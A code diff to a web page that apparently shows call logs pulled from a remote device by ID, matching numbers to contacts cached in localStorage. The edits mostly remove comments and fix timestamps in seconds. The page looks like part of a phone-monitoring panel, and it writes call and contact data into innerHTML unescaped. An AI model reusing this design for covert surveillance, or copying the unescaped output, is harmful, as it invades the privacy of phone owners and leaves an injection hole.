@@ -75,7 +75,7 @@
             display: flex; align-items: center; justify-content: center;
             flex-shrink: 0;
             border-radius: 50%;
-            background: rgba(255,255,255,0.05); /* Slight background for icon */
+            background: rgba(255,255,255,0.05);
         }
         
         .log-icon.incoming { color: var(--text-main); }
@@ -93,15 +93,12 @@
         
         .log-name.is-missed { color: var(--missed); }
 
-        /* Icon next to number/name */
         .name-icon { font-size: 0.8rem; opacity: 0.7; }
 
         .log-details-row {
             display: flex; align-items: center; gap: 6px;
             font-size: 0.8rem; color: var(--text-sub); margin-top: 3px;
         }
-
-        .log-type-icon { font-size: 0.7rem; }
 
         .call-action {
             width: 40px; height: 40px;
@@ -135,8 +132,6 @@
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
         const storageKey = `calls_${DEVICE_ID}`;
-
-        // Global variable to store detected contacts
         let cachedContacts = [];
 
         document.addEventListener("DOMContentLoaded", () => {
@@ -145,68 +140,65 @@
                 window.location.href = "index.html";
                 return;
             }
-            
-            // 1. Pehle contacts dhoondo pure LocalStorage mein
             detectContactsData();
-
             loadFromStorage();
             sendCommand();
             setTimeout(fetchLogs, 2000); 
             setInterval(fetchLogs, 10000);
         });
 
-        // --- NEW: AUTO DETECT CONTACTS ---
+        // 1. Contacts Detector
         function detectContactsData() {
-            console.log("Searching for contacts in LocalStorage...");
             try {
-                // LocalStorage ki saari keys check karenge
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
-                    // Agar key mein 'contact' likha hai
                     if (key.toLowerCase().includes("contact")) {
                         const rawData = localStorage.getItem(key);
                         if (rawData) {
                             const parsed = JSON.parse(rawData);
-                            // Check karo ki ye array hai aur isme name/phone hai kya
                             if (Array.isArray(parsed) && parsed.length > 0 && (parsed[0].name || parsed[0].phone)) {
-                                console.log(`Contacts found in key: ${key}`);
-                                cachedContacts = parsed; // Contacts mil gaye!
+                                cachedContacts = parsed;
                                 return;
                             }
                         }
                     }
                 }
-                console.log("No contacts found in LocalStorage.");
-            } catch (e) {
-                console.error("Error detecting contacts:", e);
-            }
+            } catch (e) { console.error("Contacts error", e); }
         }
 
-        // --- NAME MATCHING LOGIC ---
+        // 2. Name Matcher
         function findContactName(phoneNumber) {
             if (!cachedContacts || cachedContacts.length === 0) return null;
-            
             try {
-                // Phone number se non-digit hatao (spaces, dashes, +91 etc)
                 const cleanLogNum = phoneNumber.replace(/\D/g, '').slice(-10); 
-
                 const match = cachedContacts.find(c => {
                     if(!c.phone && !c.number) return false;
-                    const contactPhone = c.phone || c.number || ""; // Kabhi phone hota hai, kabhi number
+                    const contactPhone = c.phone || c.number || "";
                     const cleanContactNum = contactPhone.toString().replace(/\D/g, '').slice(-10);
                     return cleanContactNum === cleanLogNum;
                 });
-
                 return match ? (match.name || match.display_name) : null;
-            } catch (e) {
-                return null;
-            }
+            } catch (e) { return null; }
         }
 
-        // --- DATE FORMATTER ---
+        // --- 3. FIX: SMART DATE FORMATTER (Solves 1970 Issue) ---
         function formatSmartDate(timestamp) {
             if (!timestamp) return "Unknown";
-            const date = new Date(parseInt(timestamp));
+            
+            // Convert to Number safely
+            let timeNum = Number(timestamp);
+            
+            // FIX: Agar timestamp chota hai (seconds mein hai), to usko milliseconds banao
+            // 1000000000000 ka matlab hai Year 2001. Agar usse kam hai, to definitely seconds hain.
+            if (timeNum < 1000000000000) {
+                timeNum = timeNum * 1000;
+            }
+
+            const date = new Date(timeNum);
+            
+            // Invalid Date check
+            if (isNaN(date.getTime())) return "Invalid Date";
+
             const now = new Date();
             const yesterday = new Date(now);
             yesterday.setDate(yesterday.getDate() - 1);
@@ -230,7 +222,7 @@
                 document.getElementById("logsContainer").innerHTML = `
                     <div class="status-msg">
                         <i class="fa-solid fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
-                        <p>Loading Call History...</p>
+                        <p>Loading History...</p>
                     </div>`;
             }
         }
@@ -249,7 +241,6 @@
                 .then(data => {
                     if (data && data.length > 0) {
                         localStorage.setItem(storageKey, JSON.stringify(data));
-                        // Har bar refresh pe naye contacts bhi check kar lo (in case user ne contacts page abhi khola ho)
                         detectContactsData();
                         renderLogs(data);
                     }
@@ -263,12 +254,17 @@
             container.innerHTML = ""; 
 
             // Sort logic: Latest call upar
-            data.sort((a, b) => b.date - a.date);
+            // Date logic ko yahan bhi apply karna padega sort ke liye
+            data.sort((a, b) => {
+                let dateA = Number(a.date) < 1000000000000 ? Number(a.date) * 1000 : Number(a.date);
+                let dateB = Number(b.date) < 1000000000000 ? Number(b.date) * 1000 : Number(b.date);
+                return dateB - dateA;
+            });
 
             data.forEach(log => {
                 const type = (log.type || "").toLowerCase();
                 let iconClass = "incoming";
-                let iconSymbol = "fa-arrow-down"; // Simple arrow
+                let iconSymbol = "fa-arrow-down";
                 let isMissed = false;
 
                 if(type.includes("outgoing")) {
@@ -276,30 +272,24 @@
                     iconSymbol = "fa-arrow-up";
                 } else if(type.includes("missed") || type.includes("rejected")) {
                     iconClass = "missed";
-                    iconSymbol = "fa-xmark"; // Missed indicator
+                    iconSymbol = "fa-xmark";
                     isMissed = true;
                 }
 
-                // Match Name
                 const matchedName = findContactName(log.number);
                 const nameColorClass = isMissed ? "is-missed" : "";
 
-                // Display Logic setup
                 let mainText = "";
                 let subText = "";
-                let mainIcon = ""; // Name ke pass wala icon
+                let mainIcon = ""; 
 
                 if (matchedName) {
-                    // Contact Found
                     mainText = matchedName;
                     subText = "Mobile • " + log.number;
-                    // Agar contact hai to User icon dikhao
                     mainIcon = `<i class="fa-solid fa-user name-icon" style="margin-right:5px;"></i>`;
                 } else {
-                    // Unknown Number
                     mainText = log.number;
                     subText = "Unsaved";
-                    // Agar unknown hai to Mobile icon dikhao
                     mainIcon = `<i class="fa-solid fa-mobile-screen name-icon" style="margin-right:5px;"></i>`;
                 }
 
@@ -310,19 +300,16 @@
                         <div class="log-icon ${iconClass}">
                             <i class="fa-solid ${iconSymbol}"></i>
                         </div>
-
                         <div class="log-info">
                             <div class="log-name ${nameColorClass}">
                                 ${mainIcon} ${mainText}
                             </div>
-                            
                             <div class="log-details-row">
                                 <span>${subText}</span>
                                 <span>•</span>
                                 <span>${prettyDate}</span>
                             </div>
                         </div>
-
                         <a href="tel:${log.number}" class="call-action">
                             <i class="fa-solid fa-phone"></i>
                         </a>
